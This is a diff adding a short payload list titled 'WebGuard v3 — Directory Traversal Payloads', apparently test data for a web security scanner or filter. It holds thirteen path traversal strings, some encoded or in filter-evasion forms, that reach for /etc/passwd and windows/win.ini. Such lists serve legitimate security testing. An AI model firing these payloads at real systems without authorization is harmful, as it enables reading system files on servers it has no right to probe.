@@ -1,0 +1,14 @@
+# WebGuard v3 — Directory Traversal Payloads
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+....//....//etc/passwd
+..\/etc\/passwd
+../windows/win.ini
+..\windows\win.ini
+%2e%2e%5cwindows%5cwin.ini
